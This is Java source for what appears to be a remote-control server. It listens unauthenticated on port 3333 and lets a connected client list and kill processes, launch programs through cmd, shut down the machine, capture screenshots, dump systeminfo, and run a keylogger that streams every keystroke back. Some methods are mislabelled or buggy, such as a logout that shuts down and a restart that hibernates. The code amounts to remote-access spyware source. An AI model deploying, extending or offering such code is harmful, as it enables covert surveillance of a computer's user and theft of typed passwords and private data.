package server;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.Robot;
import java.awt.image.BufferedImage;

import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;

import com.github.kwhat.jnativehook.*;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class ServerController {

    private BufferedWriter bw;
    private OutputStream outputStream;

    private int connected = 0;

    private BufferedReader br;
    private ServerSocket ss;
    private Socket s;

    public class MyThread extends Thread {
        public void run() {
            try {
                ss = new ServerSocket(3333);
                s = ss.accept();
                connected = 1;
                outputStream = s.getOutputStream();
                br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
                int mode = Integer.parseInt(br.readLine());
                while (mode != 10) {
                    switch (mode) {
                        case 1 -> getRunningProcesses();
                        case 2 -> {
                            String timer = br.readLine();
                            shutdown(timer);
                        }
                        case 3 -> {
                            String timer = br.readLine();
                            logout(timer);
                        }
                        case 4 -> getImage();
                        case 5 -> {
                            String zs = br.readLine();
                            kill(zs);
                        }
                        case 6 -> getRunningApplication();
                        case 7 -> {
                            String zs = br.readLine();
                            startProcess(zs);
                        }
                        case 8 -> startKeylogger();
                        case 9 -> stopKeylogger();
                        case 11 -> {
                            String timer = br.readLine();
                            restart(timer);
                        }
                        case 12 -> getSpecs();
                    }
                    mode = Integer.parseInt(br.readLine());
                }
                closeServer();
            } catch (IOException | AWTException | NativeHookException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void closeServer() throws IOException {
        s.close();
        ss.close();
        myThread.interrupt();
    }
    public MyThread myThread = new MyThread();
    public void openPort() {
        if (connected == 0) {
            myThread.setDaemon(true);
            myThread.start();
        }
    }

    private NativeKeyListener nativeKeyListener = new NativeKeyListener() {
        @Override
        public void nativeKeyTyped(NativeKeyEvent nativeEvent)
        {
        }

        @Override
        public void nativeKeyReleased(NativeKeyEvent nativeEvent)
        {
            String keyText=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
            try {
                bw.write(keyText);
                bw.newLine();
                bw.flush();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void nativeKeyPressed(NativeKeyEvent nativeEvent)
        {
        }
    };

    public void getRunningProcesses() throws IOException {
        ProcessBuilder builder = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh");
        builder.redirectErrorStream(true);
        Process p = builder.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while (true) {
            line = r.readLine();
            if (line == null) {
                break;
            }
            bw.write(line);
            bw.newLine();
            bw.flush();
        }
        String zz = "\"stop\", \"pls\", \"pls\", \"pls\", \"pls\"";
        bw.write(zz);
        bw.newLine();
        bw.flush();
    }

    public void getRunningApplication() throws IOException {
        String cmd = "powershell Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object -Property Name, Id, Mainwindowtitle | Export-Csv -path .\\app.csv -NoTypeInformation ; Get-Content -path .\\app.csv";
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        r.readLine();
        while (true) {
            line = r.readLine();
            if (line == null) {
                break;
            }
            bw.write(line);
            bw.newLine();
            bw.flush();
        }
        String zz = "\"stop\", \"pls\", \"pls\"";
        bw.write(zz);
        bw.newLine();
        bw.flush();
    }

    public void shutdown(String timer) {
        ProcessBuilder processBuilder = new ProcessBuilder();
        try {
            processBuilder.command("cmd", "/c" ,"shutdown", "/s", "/t", timer);
            Process process = processBuilder.start();
            process.waitFor();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public void logout(String timer) throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd", "/c", "shutdown", "/s", "/t", timer);
        processBuilder.start();
    }

    public void getSpecs() throws IOException {
        ProcessBuilder builder = new ProcessBuilder("systeminfo");
        builder.redirectErrorStream(true);
        Process p = builder.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while (true) {
            line = r.readLine();
            if (line == null) {
                break;
            }
            bw.write(line);
            bw.newLine();
            bw.flush();
        }
        String zz = "stop";
        bw.write(zz);
        bw.newLine();
        bw.flush();
    }

    public void restart(String timer) throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd", "/c", "shutdown", "/h", "/t", timer);
        processBuilder.start();
    }

    public void getImage() throws IOException, AWTException {
        Robot robot = new Robot();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedImage bimg;
        Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        bimg = robot.createScreenCapture(rect);
        ImageIO.write(bimg, "jpg", byteArrayOutputStream);
        byte[] size = ByteBuffer.allocate(4).putInt(byteArrayOutputStream.size()).array();
        outputStream.write(size);
        outputStream.flush();
        outputStream.write(byteArrayOutputStream.toByteArray());
        outputStream.flush();
    }

    public void kill(String id) throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("taskkill", "/F", "/PID", id);
        processBuilder.start();
    }

    public void startProcess(String name) throws IOException
    {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd", "/c,", "start", name);
        processBuilder.start();
    }
    public void startKeylogger() throws NativeHookException {
        if (!GlobalScreen.isNativeHookRegistered())
            GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(nativeKeyListener);
    }
    public void stopKeylogger() throws NativeHookException, IOException {
        GlobalScreen.removeNativeKeyListener(nativeKeyListener);
        bw.write("stop");
        bw.newLine();
        bw.flush();
    }
}
